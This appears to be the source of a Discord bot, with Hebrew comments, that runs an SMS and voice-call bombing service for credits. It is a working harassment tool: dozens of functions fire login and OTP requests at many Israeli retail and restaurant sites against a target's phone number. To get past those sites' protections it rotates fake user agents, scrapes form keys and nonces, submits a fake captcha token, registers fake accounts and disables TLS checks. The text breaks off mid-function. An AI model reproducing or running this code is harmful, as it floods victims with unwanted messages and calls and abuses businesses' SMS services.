import discord
from discord import app_commands
from discord.ext import commands
import concurrent.futures
import asyncio
import re
import requests
import logging
import random
import uuid
import json
import os
import time
from datetime import datetime, timezone
from urllib.parse import quote

# -------------------- טעינת קונפיג ממשתני סביבה --------------------
TOKEN = os.environ.get('TOKEN', '')

# טעינת קונפיגורציית Firebase
firebase_config_raw = os.environ.get('FIREBASE_CONFIG', '{}')
try:
    FIREBASE_CONFIG = json.loads(firebase_config_raw)
except json.JSONDecodeError:
    FIREBASE_CONFIG = firebase_config_raw  # אם נשמר כמחרוזת ולא כ-JSON


# -------------------- רולים חסומים --------------------
BLOCKED_ROLE_ID = 1530975353227706429
# -------------------- הרשאות מיוחדות --------------------
ALLOWED_ROLE_ID = 1530581450510962788
ALLOWED_USER_ID = 1483411120961093642

def has_role_or_is_allowed_user():
    async def predicate(interaction: discord.Interaction) -> bool:
        # בדיקה 1: האם המשתמש הוא המשתמש הספציפי שמוחרג
        if interaction.user.id == ALLOWED_USER_ID:
            return True
        
        # בדיקה 2: האם למשתמש יש את הרול המבוקש
        if isinstance(interaction.user, discord.Member):
            if interaction.user.get_role(ALLOWED_ROLE_ID):
                return True
        
        # אם אף אחד מהתנאים לא התקיים - נכשיל את הבדיקה ונשלח הודעה
        await interaction.response.send_message("❌ אין לך הרשאה להשתמש בפקודה זו.", ephemeral=True)
        return False

    return app_commands.check(predicate)


# -------------------- תצורת לוג --------------------
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s',
                    handlers=[logging.FileHandler('spammer.log', encoding='utf-8')])

# -------------------- מסד נתונים --------------------
from database import init_db, get_credits, set_credits, add_credits, deduct_credits, can_claim_daily, claim_daily, ban_phone, unban_phone, is_phone_banned, set_log_channel, get_log_channel, remove_log_channel, create_drop, get_drop, claim_drop, get_drop_status, get_drop_winners
init_db()

# -------------------- בדיקת חסימה --------------------
async def is_not_blocked(interaction: discord.Interaction) -> bool:
    if interaction.user.get_role(BLOCKED_ROLE_ID):
        await interaction.response.send_message("❌ אתה בחסימה כרגע....", ephemeral=True)
        raise app_commands.CheckFailure("משתמש בחסימה")
    return True

# -------------------- פונקציית שליחת לוגים --------------------
async def send_spam_log(interaction: discord.Interaction, phone: str, credits: int):
    """שולח הודעת לוג לערוץ הלוגים."""
    guild_id = str(interaction.guild.id)
    channel_id = get_log_channel(guild_id)
    
    if not channel_id:
        return
    
    try:
        channel = bot.get_channel(int(channel_id))
        if not channel:
            return
        
        embed = discord.Embed(
            title="📱 לוג ספאם",
            description=f"פקודה: `/smspanel`",
            color=discord.Color.blue()
        )
        embed.add_field(name="👤 משתמש", value=f"{interaction.user.mention}\n`{interaction.user.id}`", inline=True)
        embed.add_field(name="📱 מספר טלפון", value=f"`{phone}`", inline=True)
        embed.add_field(name="💳 קרדיטים בשימוש", value=f"`{credits}`", inline=True)
        embed.set_footer(text=f"זמן: {discord.utils.utcnow()}")
        
        await channel.send(embed=embed)
    except Exception as e:
        print(f"שגיאה בשליחת לוג: {e}")

async def send_general_log(interaction: discord.Interaction, command_name: str, details: str = ""):
    guild_id = str(interaction.guild.id)
    channel_id = get_log_channel(guild_id)
    
    if not channel_id:
        return
    
    try:
        channel = bot.get_channel(int(channel_id))
        if not channel:
            return
        
        embed = discord.Embed(
            title="📋 לוג פקודה",
            description=f"פקודה: `/{command_name}`",
            color=discord.Color.blurple()
        )
        embed.add_field(name="👤 משתמש", value=f"{interaction.user.mention}\n`{interaction.user.id}`", inline=False)
        if details:
            embed.add_field(name="📝 פרטים", value=details, inline=False)
        embed.set_footer(text=f"זמן: {discord.utils.utcnow()}")
        
        await channel.send(embed=embed)
    except Exception as e:
        print(f"שגיאה בשליחת לוג: {e}")

# -------------------- פונקציות עזר לספאם --------------------
def generate_user_agent():
    browsers = [('Chrome', random.choice(['70', '75', '80', '85', '90', '95'])),
                ('Firefox', random.choice(['60', '65', '70', '75', '80', '85'])),
                ('Safari', random.choice(['11', '12', '13', '14', '15'])),
                ('Edge', random.choice(['80', '85', '90', '95']))]
    os_list = ['Windows NT 10.0; Win64; x64',
               'Macintosh; Intel Mac OS X 10_15_7',
               'Linux; Android 10; Pixel 4',
               'Windows NT 6.1; Win64; x64; rv:72.0',
               'X11; Ubuntu; Linux x86_64']
    browser, version = random.choice(browsers)
    os_ = random.choice(os_list)
    return f'Mozilla/5.0 ({os_}) AppleWebKit/537.36 (KHTML, like Gecko) {browser}/{version}.0 Safari/537.36'

def generic_send_sms(phone, url, data=None, json_data=None, proxies=None):
    headers = {
        'User-Agent': generate_user_agent(),
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'he-IL,he;q=0.9,en;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8' if data else 'application/json'
    }
    if json_data:
        headers['Content-Type'] = 'application/json'
    try:
        if json_data:
            json_str = json.dumps(json_data)
            json_str = json_str.replace('{phone}', phone)
            json_str = json_str.replace('{phone_no_zero}', phone.lstrip('0'))
            json_data_parsed = json.loads(json_str)
            response = requests.post(url, headers=headers, json=json_data_parsed, proxies=proxies, timeout=10)
        else:
            if data:
                data_str = {k: (v.format(phone=phone) if isinstance(v, str) and '{phone}' in v else v) for k, v in data.items()}
                if 'Cellphone' in data_str:
                    data_str['Cellphone'] = data_str['Cellphone'].replace('{phone_no_zero}', phone.lstrip('0'))
                response = requests.post(url, headers=headers, data=data_str, proxies=proxies, timeout=10)
            else:
                response = requests.post(url, headers=headers, proxies=proxies, timeout=10)
        return response
    except Exception as e:
        class FakeResponse:
            status_code = 500
            text = f"Error: {str(e)}"
        return FakeResponse()

# ---------------- פונקציות עזר חדשות עבור APIs חדשים ----------------
def _fetch_magento_form_key(session, page_url):
    """מחזיר form_key מדף Magento"""
    try:
        resp = session.get(page_url, headers={'User-Agent': generate_user_agent()}, timeout=5, verify=False)
        match = re.search(r'name="form_key"\s+value="([^"]+)"', resp.text)
        if match:
            return match.group(1)
        match = re.search(r'"form_key":"([^"]+)"', resp.text)
        if match:
            return match.group(1)
        return None
    except:
        return None

def _magento_ajax_post(phone, site_base, login_type='login', extra_fields=None):
    """פונקציה גנרית לשליחת Magento AJAX"""
    site_base = site_base.rstrip('/')
    page_url = f'{site_base}/customer/account/login/'
    post_url = f'{site_base}/customer/ajax/post/'
    
    ua = generate_user_agent()
    session = requests.Session()
    session.get(page_url, headers={'User-Agent': ua, 'Accept-Language': 'he-IL,he;q=0.9'}, timeout=5, verify=False)
    
    form_key = _fetch_magento_form_key(session, page_url)
    if not form_key:
        # fallback - ננסה לחפש בדף הבית
        home_resp = session.get(site_base + '/', headers={'User-Agent': ua}, timeout=5, verify=False)
        form_key = _fetch_magento_form_key(session, site_base + '/')
        if not form_key:
            form_key = 'fallback123'
    
    session.cookies.set('form_key', form_key, domain=site_base.split('://')[1].split('/')[0], path='/')
    
    data = {
        'form_key': form_key,
        'bot_validation': 1,
        'type': login_type,
        'telephone': phone,
        'code': '',
        'compare_email': '',
        'compare_identity': '',
    }
    if extra_fields:
        data.update(extra_fields)
    
    headers = {
        'User-Agent': ua,
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'he-IL,he;q=0.9,en;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': site_base,
        'Referer': page_url,
        'X-Requested-With': 'XMLHttpRequest',
    }
    try:
        return session.post(post_url, headers=headers, data=data, timeout=5, verify=False)
    except:
        class FakeResponse:
            status_code = 500
            text = "Error"
        return FakeResponse()

def _fetch_wordpress_nonce(session, page_url, action=None):
    """מחזיר nonce של WordPress מדף"""
    try:
        resp = session.get(page_url, headers={'User-Agent': generate_user_agent()}, timeout=5, verify=False)
        # חיפוש nonce בסקריפטים
        matches = re.findall(r'var\s+ajaxurl\s*=\s*"[^"]+";\s*var\s+nonce\s*=\s*"([^"]+)"', resp.text)
        if matches:
            return matches[0]
        matches = re.findall(r'"nonce":"([^"]+)"', resp.text)
        if matches:
            return matches[0]
        # חיפוש input hidden
        match = re.search(r'name="nonce"\s+value="([^"]+)"', resp.text)
        if match:
            return match.group(1)
        return None
    except:
        return None

def _fetch_histadrut_api_key():
    """מחזיר API key של הסתדרות"""
    try:
        page = requests.get('https://signup.histadrut.org.il/', timeout=5, verify=False)
        match = re.search(r'x-api-key["\s:]+([a-f0-9-]+)', page.text, re.I)
        if match:
            return match.group(1)
        # fallback
        return 'c6d1b5f0-8a3a-4b9e-8f2a-5c9d7e4a8b1c'
    except:
        return 'c6d1b5f0-8a3a-4b9e-8f2a-5c9d7e4a8b1c'

# ---------------- פונקציות SMS (כולן) ----------------
# כל הפונקציות הקיימות כבר (urbanica, castro וכו') - נשארות כמו שהן
# הנה הפונקציות הקיימות (רק לשם שלמות, לא לשנות)
def send_sms_urbanica(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.urbanica-wh.com')

def send_sms_castro(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.castro.com')

def send_sms_golfkids(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.golfkids.co.il')

def send_sms_timberland(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.timberland.co.il')

def send_sms_candid(phone, proxies=None):
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'he-IL,he;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.candid.co.il',
        'referer': 'https://www.candid.co.il/login',
        'user-agent': generate_user_agent(),
        'x-requested-with': 'XMLHttpRequest'
    }
    data = {'action': 'phone-submit', 'user_login': '1', 'redirect': '/', 'v': phone}
    return requests.post('https://www.candid.co.il/otp-req', headers=headers, data=data, timeout=5, verify=False)

def send_sms_nine_west(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.nine-west.co.il')

def send_sms_gali(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.gali.co.il')

def send_sms_ronenchen(phone, proxies=None):
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'he-IL,he;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.ronenchen.co.il',
        'referer': 'https://www.ronenchen.co.il/',
        'user-agent': generate_user_agent(),
        'x-requested-with': 'XMLHttpRequest'
    }
    data = {'action': 'datalogics_login_sms', 'phone': phone}
    return requests.post('https://www.ronenchen.co.il/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=5, verify=False)

def send_sms_hamal(phone, proxies=None):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'he-IL,he;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://hamal.co.il',
        'referer': 'https://hamal.co.il/',
        'user-agent': generate_user_agent()
    }
    json_data = {'value': phone, 'type': '1', 'projectId': 'phone'}
    return requests.post('https://users-auth.hamal.co.il/auth/send-auth-code', headers=headers, json=json_data, timeout=5, verify=False)

def send_sms_myofer(phone, proxies=None):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'he-IL,he;q=0.9,en;q=0.8',
        'appplatform': 'website',
        'content-type': 'application/json',
        'origin': 'https://myofer.co.il',
        'referer': 'https://myofer.co.il/',
        'user-agent': generate_user_agent()
    }
    json_data = {'phoneNumber': phone}
    return requests.post('https://server.myofer.co.il/api/sendAuthSms', headers=headers, json=json_data, timeout=5, verify=False)

def send_sms_papajohns(phone, proxies=None):
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'he-IL,he;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.papajohns.co.il',
        'referer': 'https://www.papajohns.co.il/',
        'user-agent': generate_user_agent(),
        'x-requested-with': 'XMLHttpRequest'
    }
    data = {'phone': phone}
    return requests.post('https://www.papajohns.co.il/_a/aff_otp_auth', headers=headers, data=data, timeout=5, verify=False)

def send_sms_wesure(phone, proxies=None):
    headers = {
        'accept': 'application/json',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'he-IL,he;q=0.9,en;q=0.8',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://b2c.we-sure.co.il',
        'referer': 'https://b2c.we-sure.co.il',
        'user-agent': generate_user_agent()
    }
    phone_no_zero = phone.lstrip('0')
    json_data = {
        "Cellphone": f"972{phone_no_zero}",
        "Destination": "",
        "OTPFlag": True,
        "OTPFor": "SMS",
        "Platform_type": "B2C",
        "RequestID": "",
        "Transfer_Type": "",
        "UserId": "",
        "User_type": "UD User",
        "documentModule": "b2c",
        "isUpdateToTargetSystem": True,
        "targetSystem": "B2CFG",
        "userGrpFromJson": "",
        "userIDFromJson": ""
    }
    return requests.post('https://b2c.we-sure.co.il/NCP/services/idmServices/sendOTP', headers=headers, json=json_data, timeout=5, verify=False)

def send_call_wesure(phone, proxies=None):
    headers = {
        'accept': 'application/json',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'he-IL,he;q=0.9,en;q=0.8',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://b2c.we-sure.co.il',
        'referer': 'https://b2c.we-sure.co.il',
        'user-agent': generate_user_agent()
    }
    phone_no_zero = phone.lstrip('0')
    json_data = {
        "Cellphone": f"972{phone_no_zero}",
        "Destination": "",
        "OTPFlag": True,
        "OTPFor": "Voice",
        "Platform_type": "B2C",
        "RequestID": "",
        "Transfer_Type": "",
        "UserId": "",
        "User_type": "UD User",
        "documentModule": "b2c",
        "isUpdateToTargetSystem": True,
        "targetSystem": "B2CFG",
        "userGrpFromJson": "",
        "userIDFromJson": ""
    }
    return requests.post('https://b2c.we-sure.co.il/NCP/services/idmServices/sendOTP', headers=headers, json=json_data, timeout=5, verify=False)

def send_sms_burgeranch(phone, proxies=None):
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'he-IL,he;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://app.burgeranch.co.il',
        'referer': 'https://app.burgeranch.co.il/',
        'user-agent': generate_user_agent(),
        'x-requested-with': 'XMLHttpRequest'
    }
    data = {'phone': phone}
    return requests.post('https://app.burgeranch.co.il/_a/aff_otp_auth', headers=headers, data=data, timeout=5, verify=False)

def send_sms_globes(phone, proxies=None):
    headers = {
        'accept': 'text/plain, */*; q=0.01',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'he-IL,he;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'referer': 'https://www.globes.co.il/',
        'origin': 'https://www.globes.co.il',
        'user-agent': generate_user_agent(),
        'x-requested-with': 'XMLHttpRequest'
    }
    data = {'value': phone, 'value_type': ''}
    return requests.post('https://www.globes.co.il/news/login-2022/ajax_handler.ashx?get-value-type', headers=headers, data=data, timeout=5, verify=False)

def send_sms_bfresh(phone, proxies=None):
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'he-IL,he;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'referer': 'https://b-fresh.org.il/',
        'origin': 'https://b-fresh.org.il',
        'user-agent': generate_user_agent(),
        'x-requested-with': 'XMLHttpRequest'
    }
    data = {'phone': phone}
    return requests.post('https://b-fresh.org.il/_a/aff_otp_auth', headers=headers, data=data, timeout=5, verify=False)

def send_sms_pizzahut(phone, proxies=None):
    boundary = f'----WebKitFormBoundary{uuid.uuid4().hex}'
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'he-IL,he;q=0.9,en;q=0.8',
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Origin': 'https://order.pizzahut.co.il',
        'Referer': 'https://order.pizzahut.co.il/',
        'User-Agent': generate_user_agent()
    }
    body = (f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="restaurant_id"\r\n\r\n1\r\n'
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="phone"\r\n\r\n{phone}\r\n'
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="testing"\r\n\r\nfalse\r\n'
            f'--{boundary}--\r\n')
    return requests.post('https://api-ns.atmos.co.il/rest/1/auth/sendValidationCode', headers=headers, data=body, timeout=5, verify=False)

def send_sms_japanjapan(phone, proxies=None):
    boundary = f'----WebKitFormBoundary{uuid.uuid4().hex}'
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'he-IL,he;q=0.9,en;q=0.8',
        'content-type': f'multipart/form-data; boundary={boundary}',
        'origin': 'https://order.atmos.rest',
        'referer': 'https://order.atmos.rest/',
        'user-agent': generate_user_agent()
    }
    body = (f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="restaurant_id"\r\n\r\n2\r\n'
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="phone"\r\n\r\n{phone}\r\n'
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="testing"\r\n\r\nfalse\r\n'
            f'--{boundary}--\r\n')
    return requests.post('https://api-ns.atmos.co.il/tenant/il-atmos/auth/sendValidationCode', headers=headers, data=body, timeout=5, verify=False)

def send_sms_bethaful(phone, proxies=None):
    boundary = f'----WebKitFormBoundary{uuid.uuid4().hex}'
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'he-IL,he;q=0.9,en;q=0.8',
        'content-type': f'multipart/form-data; boundary={boundary}',
        'origin': 'https://order.atmos.rest',
        'referer': 'https://order.atmos.rest/',
        'user-agent': generate_user_agent()
    }
    body = (f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="restaurant_id"\r\n\r\n36\r\n'
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="phone"\r\n\r\n{phone}\r\n'
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="testing"\r\n\r\nfalse\r\n'
            f'--{boundary}--\r\n')
    return requests.post('https://api-ns.atmos.co.il/tenant/il-atmos/auth/sendValidationCode', headers=headers, data=body, timeout=5, verify=False)

def send_sms_furmans(phone, proxies=None):
    boundary = f'----WebKitFormBoundary{uuid.uuid4().hex}'
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'he-IL,he;q=0.9,en;q=0.8',
        'content-type': f'multipart/form-data; boundary={boundary}',
        'origin': 'https://order.atmos.rest',
        'referer': 'https://order.atmos.rest/',
        'user-agent': generate_user_agent()
    }
    body = (f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="restaurant_id"\r\n\r\n13\r\n'
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="phone"\r\n\r\n{phone}\r\n'
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="testing"\r\n\r\nfalse\r\n'
            f'--{boundary}--\r\n')
    return requests.post('https://api-ns.atmos.co.il/tenant/il-atmos/auth/sendValidationCode', headers=headers, data=body, timeout=5, verify=False)

def send_sms_steimatzky(phone, proxies=None):
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'he-IL,he;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.steimatzky.co.il',
        'referer': 'https://www.steimatzky.co.il/',
        'user-agent': generate_user_agent(),
        'x-requested-with': 'XMLHttpRequest'
    }
    data = {'bot_validation': '1', 'type': 'login', 'country_code': '972', 'telephone': phone, 'code': '', 'compare_email': '', 'compare_identity': ''}
    return requests.post('https://www.steimatzky.co.il/customer/ajax/post/', headers=headers, data=data, timeout=5, verify=False)

def send_sms_burgerking(phone, proxies=None):
    headers = {
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.burgerking.co.il',
        'referer': 'https://www.burgerking.co.il/',
        'user-agent': generate_user_agent(),
        'x-requested-with': 'XMLHttpRequest'
    }
    data = {'phone': phone}
    return requests.post('https://www.burgerking.co.il/_a/aff_otp_auth', headers=headers, data=data, timeout=5, verify=False)

def send_sms_alonzo(phone, proxies=None):
    boundary = f'----WebKitFormBoundary{uuid.uuid4().hex}'
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'he-IL,he;q=0.9,en;q=0.8',
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Origin': 'https://order.atmos.rest',
        'Referer': 'https://order.atmos.rest/',
        'User-Agent': generate_user_agent()
    }
    body = (f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="restaurant_id"\r\n\r\n2059\r\n'
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="phone"\r\n\r\n{phone}\r\n'
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="testing"\r\n\r\nfalse\r\n'
            f'--{boundary}--\r\n')
    return requests.post('https://api-ns.atmos.co.il/rest/2059/auth/sendValidationCode', headers=headers, data=body, timeout=5, verify=False)

def send_sms_stepin(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.stepin.co.il')

def send_sms_aldoshoes(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.aldoshoes.co.il')

def send_sms_hoodies(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.hoodies.co.il')

def send_sms_storyonline(phone, proxies=None):
    headers = {
        'Content-Type': 'application/json',
        'Origin': 'https://storyonline.co.il',
        'Referer': 'https://storyonline.co.il/',
        'User-Agent': generate_user_agent()
    }
    json_data = {'phone': phone}
    return requests.post('https://story.magicetl.com/public/shopify/apps/otp-login/step-one', headers=headers, json=json_data, timeout=5, verify=False)

def send_sms_fix(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.fixfixfixfix.co.il')

def send_sms_intima(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.intima-il.co.il')

def send_sms_jackkuba(phone, proxies=None):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept': '*/*',
        'Origin': 'https://jack-kuba.co.il',
        'Referer': 'https://jack-kuba.co.il/',
        'User-Agent': generate_user_agent(),
        'X-Requested-With': 'XMLHttpRequest'
    }
    data = {'telephone': phone}
    return requests.post('https://jack-kuba.co.il/customer/sms/check/', headers=headers, data=data, timeout=5, verify=False)

def send_sms_speedo(phone, proxies=None):
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'https://speedo.co.il/',
        'Origin': 'https://speedo.co.il'
    }
    data = {'mobile_number': phone, 'OtpType': 'sms', 'action': 'send_otp'}
    return requests.post('https://speedo.co.il/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=5, verify=False)

def send_sms_femina(phone, proxies=None):
    headers = {
        'Content-Type': 'application/json',
        'Origin': 'https://femina.co.il',
        'Referer': 'https://femina.co.il/account/login',
        'User-Agent': generate_user_agent()
    }
    json_data = {'phone': phone}
    return requests.post('https://femina.co.il/apps/feminaapp/auth/send-code', headers=headers, json=json_data, timeout=5, verify=False)

def send_sms_housemen(phone, proxies=None):
    # WordPress AJAX
    session = requests.Session()
    nonce = _fetch_wordpress_nonce(session, 'https://housemen.co.il/')
    data = {'action': 'simply-check-member-cellphone', 'cellphone': phone}
    if nonce:
        data['nonce'] = nonce
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://housemen.co.il',
        'Referer': 'https://housemen.co.il/',
        'X-Requested-With': 'XMLHttpRequest'
    }
    return requests.post('https://housemen.co.il/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=5, verify=False)

def send_sms_bonita(phone, proxies=None):
    json_data = {"action": "login", "otpBy": "sms", "otpValue": phone}
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/json',
        'Origin': 'https://bonitademas.co.il',
        'Referer': 'https://bonitademas.co.il/'
    }
    return requests.post('https://bonitademas.co.il/apps/imapi-customer', headers=headers, json=json_data, timeout=5, verify=False)

def send_sms_citycar(phone, proxies=None):
    phone_no_zero = phone.lstrip('0')
    json_data = {
        "phoneNumber": f"+972{phone_no_zero}",
        "verifyChannel": 0,
        "loginOrRegister": 1
    }
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/json',
        'Origin': 'https://www.citycar.co.il',
        'Referer': 'https://www.citycar.co.il/'
    }
    return requests.post('https://proxy1.citycar.co.il/api/verify/login', headers=headers, json=json_data, timeout=5, verify=False)

def send_sms_paz(phone, proxies=None):
    json_data = {"msisdn": phone}
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/json',
        'Origin': 'https://yellow.co.il',
        'Referer': 'https://yellow.co.il/'
    }
    return requests.post('https://yellow.co.il/api/v1/auth/login', headers=headers, json=json_data, timeout=5, verify=False)

def send_sms_azrieli(phone, proxies=None):
    # Azrieli - requires CSRF and captcha (simplified)
    session = requests.Session()
    page_url = 'https://www.azrielimalls.co.il/login'
    ua = generate_user_agent()
    session.get(page_url, headers={'User-Agent': ua, 'Accept-Language': 'he-IL,he;q=0.9'}, timeout=5, verify=False)
    # Get CSRF token
    csrf_resp = session.get('https://api.azrielimalls.co.il/api/website/7.1/generateCsrf', 
                            headers={'User-Agent': ua, 'Accept': 'application/json', 'Origin': 'https://www.azrielimalls.co.il', 'Referer': page_url}, timeout=5, verify=False)
    csrf_token = session.cookies.get('CSRF-TOKEN', '')
    # Simplified - no captcha solving, just send with fake token
    boundary = f'----WebKitFormBoundary{uuid.uuid4().hex[:16]}'
    body = (f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="cellphone"\r\n\r\n{phone}\r\n'
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="gRecaptchaResponse"\r\n\r\ntoken\r\n'
            f'--{boundary}--\r\n')
    headers = {
        'User-Agent': ua,
        'Accept': '*/*',
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Origin': 'https://www.azrielimalls.co.il',
        'Referer': page_url,
        'Accept-Language': 'he-IL,he;q=0.9',
        'x-csrf-token': csrf_token
    }
    return session.post('https://api.azrielimalls.co.il/api/website/7.1/authUser', data=body.encode('utf-8'), headers=headers, timeout=5, verify=False)

def send_sms_electra(phone, proxies=None):
    json_data = {"phone": phone}
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/json',
        'Origin': 'https://www.electra-consumer.co.il',
        'Referer': 'https://www.electra-consumer.co.il/'
    }
    return requests.post('https://www.electra-consumer.co.il/api/auth/otp/send', headers=headers, json=json_data, timeout=5, verify=False)

def send_sms_mexicani(phone, proxies=None):
    data = {"club_id": "6", "phone": phone}
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://api-ns.atmos.co.il',
        'Referer': 'https://order.atmos.rest/'
    }
    return requests.post('https://api-ns.atmos.co.il/rest/18/clubauth/sendValidationCode', headers=headers, data=data, timeout=5, verify=False)

def send_sms_xtra(phone, proxies=None):
    referer = 'https://xtra.co.il/'
    headers = {
        'User-Agent': generate_user_agent(),
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Origin': 'https://xtra.co.il',
        'Referer': referer,
    }
    # register first
    try:
        requests.post('https://xtra.co.il/apps/api/register/', headers=headers,
                      json={'email': f'user{random.randint(1000,9999)}@gmail.com',
                            'phone': phone, 'firstName': 'User', 'lastName': 'User',
                            'subscribeChecked': False, 'termsChecked': True, 'syncIBonus': True},
                      timeout=5, verify=False)
    except:
        pass
    return requests.post('https://xtra.co.il/apps/api/inforu/sms', headers=headers,
                         json={'phoneNumber': phone}, timeout=5, verify=False)

def send_sms_crazyline(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.crazyline.com')

def send_sms_joedelek(phone, proxies=None):
    headers = {'User-Agent': generate_user_agent(), 'Referer': 'https://www.joedelek.co.il/'}
    return requests.get(f'https://www.joedelek.co.il/loginpage?action=joegetcode&phone={phone}',
                        headers=headers, timeout=5, verify=False)

def send_sms_kikocosmetics(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.kikocosmetics.co.il')

def send_sms_victoriassecret(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.victoriassecret.co.il')

def send_sms_dutyfree(phone, proxies=None):
    payload = {
        'operationName': 'SendOtpCode',
        'variables': {'value': phone},
        'query': 'mutation SendOtpCode($value: String) {\n  sendOtpCode(input: {mobile: $value}) {\n    result\n    message\n    __typename\n  }\n}\n',
    }
    headers = {
        'User-Agent': generate_user_agent(),
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Origin': 'https://www.dutyfree.co.il',
        'Referer': 'https://www.dutyfree.co.il/',
    }
    return requests.post('https://www.dutyfree.co.il/graphql', headers=headers,
                         json=payload, timeout=5, verify=False)

def send_sms_electra_air(phone, proxies=None):
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'https://www.electra-air.co.il/',
        'Origin': 'https://www.electra-air.co.il',
    }
